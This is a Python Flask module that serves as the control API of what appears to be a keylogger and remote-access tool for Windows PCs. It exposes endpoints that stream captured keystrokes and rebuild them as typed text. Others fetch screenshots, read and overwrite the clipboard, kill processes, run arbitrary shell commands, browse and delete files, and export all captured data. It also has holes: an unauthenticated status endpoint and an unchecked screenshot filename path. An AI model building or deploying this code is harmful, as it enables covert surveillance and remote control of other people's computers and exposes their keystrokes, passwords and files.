"""
API Routes - Flask application and all endpoints
Fixed version with proper Flask initialization
"""
import os
import base64
import time
import signal
from datetime import datetime
from threading import Thread
from flask import Flask, request, jsonify
from flask_cors import CORS

from .monitoring import (
    start_monitoring, stop_monitoring, get_monitoring_status,
    get_events, get_keystrokes, log_event
)
from .screenshots import (
    take_screenshot, get_screenshot_history, get_latest_screenshot,
    set_auto_screenshot
)
from .remote_commands import execute_remote_command
from .config import SCREENSHOTS_DIR, CONFIG_FILE, config, pc_id

# Initialize Flask app
app = Flask(__name__)
CORS(app)

API_KEY = config['api_key']

def require_auth(f):
    """Authentication decorator"""
    def decorated(*args, **kwargs):
        request_key = request.headers.get('X-API-Key')
        if request_key != API_KEY:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

@app.route('/api/status', methods=['GET'])
def status():
    """Get current monitoring status (no auth required)"""
    return jsonify({
        "monitoring": get_monitoring_status(),
        "event_count": len(get_events()),
        "keystroke_count": len(get_keystrokes()),
        "screenshot_count": len(get_screenshot_history()),
        "pc_id": pc_id,
        "pc_name": config.get('pc_name', 'Unknown'),
        "auto_screenshot": config.get('auto_screenshot', False),
        "offline_mode": False
    })

@app.route('/api/start', methods=['POST'])
@require_auth
def start():
    """Start monitoring"""
    result = start_monitoring(pc_id)
    return jsonify(result)

@app.route('/api/stop', methods=['POST'])
@require_auth
def stop():
    """Stop monitoring"""
    result = stop_monitoring(pc_id)
    return jsonify(result)

@app.route('/api/kill', methods=['POST'])
@require_auth
def kill_server():
    """Kill the server process"""
    log_event("server_killed", {"source": "remote_client"}, pc_id)
    stop_monitoring(pc_id)
    
    response = jsonify({"status": "server_killed", "message": "Server shutting down..."})
    
    def shutdown():
        time.sleep(1)
        print("\n[!] Server killed by remote client")
        os.kill(os.getpid(), signal.SIGTERM)
    
    Thread(target=shutdown, daemon=True).start()
    return response

@app.route('/api/events', methods=['GET'])
@require_auth
def get_events_api():
    """Get logged events with filtering"""
    limit = int(request.args.get('limit', 100))
    event_type = request.args.get('type', None)
    search = request.args.get('search', None)
    
    filtered = get_events()
    
    if event_type:
        filtered = [e for e in filtered if e['type'] == event_type]
    
    if search:
        search_lower = search.lower()
        filtered = [e for e in filtered if 
                   search_lower in str(e.get('details', {})).lower() or
                   search_lower in e['type'].lower()]
    
    return jsonify(filtered[-limit:])

@app.route('/api/keystrokes/live', methods=['GET'])
@require_auth
def get_live_keystrokes():
    """Get recent keystrokes (live feed)"""
    buffer = get_keystrokes()[-50:]
    return jsonify(buffer)

@app.route('/api/keystrokes/buffer', methods=['GET'])
@require_auth
def get_keystroke_buffer():
    """Get buffered keystrokes"""
    limit = int(request.args.get('limit', 1000))
    format_as_text = request.args.get('format', 'json') == 'text'
    
    buffer = get_keystrokes()[-limit:]
    
    if format_as_text:
        text = ""
        for ks in buffer:
            key = ks['key']
            if key.startswith('Key.'):
                key_name = key.replace('Key.', '')
                if key_name == 'space':
                    text += ' '
                elif key_name == 'enter':
                    text += '\n'
                elif key_name == 'tab':
                    text += '\t'
            else:
                text += key
        return jsonify({"text": text, "count": len(buffer)})
    else:
        return jsonify(buffer)

@app.route('/api/snapshot', methods=['POST'])
@require_auth
def snapshot():
    """Take an immediate screenshot"""
    filepath = take_screenshot()
    if filepath:
        log_event("screenshot", {"filename": filepath.name}, pc_id)
        return jsonify({"status": "success", "filename": filepath.name})
    return jsonify({"error": "Failed to capture screenshot"}), 500

@app.route('/api/screenshot/latest', methods=['GET'])
@require_auth
def get_latest_screenshot_api():
    """Get the most recent screenshot"""
    latest = get_latest_screenshot()
    if not latest:
        return jsonify({"error": "No screenshots available"}), 404
    
    try:
        with open(latest['path'], 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')
        
        return jsonify({
            "image": image_data,
            "timestamp": latest['timestamp'],
            "filename": latest['filename']
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/screenshot/history', methods=['GET'])
@require_auth
def get_screenshot_history_api():
    """Get screenshot history list"""
    return jsonify(get_screenshot_history())

@app.route('/api/screenshot/<filename>', methods=['GET'])
@require_auth
def get_screenshot(filename):
    """Get specific screenshot by filename"""
    filepath = SCREENSHOTS_DIR / filename
    
    if not filepath.exists():
        return jsonify({"error": "Screenshot not found"}), 404
    
    try:
        with open(filepath, 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')
        
        return jsonify({"image": image_data, "filename": filename})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/settings/screenshot', methods=['POST'])
@require_auth
def update_screenshot_settings():
    """Update automatic screenshot settings"""
    data = request.json or {}
    
    if 'enabled' in data:
        config['auto_screenshot'] = data['enabled']
    
    if 'interval' in data:
        config['screenshot_interval'] = int(data['interval'])
    
    set_auto_screenshot(
        config['auto_screenshot'],
        config.get('screenshot_interval', 300)
    )
    
    import json
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)
    
    return jsonify({
        "enabled": config['auto_screenshot'],
        "interval": config.get('screenshot_interval', 300)
    })

@app.route('/api/command', methods=['POST'])
@require_auth
def execute_command():
    """Execute remote command"""
    data = request.json or {}
    result = execute_remote_command(data, pc_id, log_event)
    
    if isinstance(result, tuple):
        return jsonify(result[0]), result[1]
    return jsonify(result)

@app.route('/api/clipboard', methods=['GET'])
@require_auth
def get_clipboard():
    """Get clipboard content"""
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        try:
            content = win32clipboard.GetClipboardData()
        except:
            content = ""
        win32clipboard.CloseClipboard()
        
        log_event("clipboard", {"operation": "get"}, pc_id)
        return jsonify({
            "success": True,
            "content": content,
            "timestamp": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/clipboard', methods=['POST'])
@require_auth
def set_clipboard():
    """Set clipboard content"""
    try:
        data = request.json or {}
        content = data.get('content', '')
        
        import win32clipboard
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(content)
        win32clipboard.CloseClipboard()
        
        log_event("clipboard", {"operation": "set", "length": len(content)}, pc_id)
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/process', methods=['GET'])
@require_auth
def get_processes():
    """Get list of running processes"""
    try:
        import psutil
        processes = []
        
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
            try:
                info = proc.info
                processes.append({
                    'pid': info['pid'],
                    'name': info['name'],
                    'username': info.get('username', 'Unknown'),
                    'cpu_percent': info.get('cpu_percent', 0),
                    'memory_mb': info['memory_info'].rss / (1024 * 1024) if info.get('memory_info') else 0
                })
            except:
                continue
        
        log_event("process", {"operation": "list", "count": len(processes)}, pc_id)
        return jsonify({"success": True, "processes": processes})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/process', methods=['POST'])
@require_auth
def manage_process():
    """Manage processes (kill/start)"""
    try:
        data = request.json or {}
        operation = data.get('operation')
        
        if operation == 'kill':
            import psutil
            pid = data.get('pid')
            proc = psutil.Process(pid)
            proc.terminate()
            log_event("process", {"operation": "kill", "pid": pid}, pc_id)
            return jsonify({"success": True})
        
        elif operation == 'start':
            import subprocess
            command = data.get('command')
            subprocess.Popen(command, shell=True)
            log_event("process", {"operation": "start", "command": command}, pc_id)
            return jsonify({"success": True})
        
        else:
            return jsonify({"error": "Invalid operation"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/filesystem', methods=['GET'])
@require_auth
def list_filesystem():
    """List directory contents"""
    try:
        import os
        from pathlib import Path
        
        path = request.args.get('path', 'C:\\')
        path_obj = Path(path)
        
        if not path_obj.exists():
            return jsonify({"error": "Path does not exist"}), 404
        
        items = []
        for item in path_obj.iterdir():
            try:
                stat = item.stat()
                items.append({
                    'name': item.name,
                    'path': str(item),
                    'type': 'directory' if item.is_dir() else 'file',
                    'size': stat.st_size if item.is_file() else 0,
                    'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                    'permissions': stat.st_mode
                })
            except:
                continue
        
        log_event("filesystem", {"operation": "list", "path": path}, pc_id)
        return jsonify({
            "success": True,
            "path": str(path_obj),
            "parent": str(path_obj.parent) if path_obj.parent != path_obj else None,
            "items": items
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/filesystem', methods=['POST'])
@require_auth
def manage_filesystem():
    """Filesystem operations (mkdir, delete)"""
    try:
        data = request.json or {}
        operation = data.get('operation')
        path = data.get('path')
        
        if operation == 'mkdir':
            os.makedirs(path, exist_ok=True)
            log_event("filesystem", {"operation": "mkdir", "path": path}, pc_id)
            return jsonify({"success": True})
        
        elif operation == 'delete':
            import shutil
            if os.path.isdir(path):
                shutil.rmtree(path)
            else:
                os.remove(path)
            log_event("filesystem", {"operation": "delete", "path": path}, pc_id)
            return jsonify({"success": True})
        
        else:
            return jsonify({"error": "Invalid operation"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/export', methods=['GET'])
@require_auth
def export_data():
    """Export all data"""
    export_type = request.args.get('type', 'events')
    
    if export_type == 'events':
        data = get_events()
    elif export_type == 'keystrokes':
        data = get_keystrokes()
    else:
        return jsonify({"error": "Invalid export type"}), 400
    
    return jsonify(data)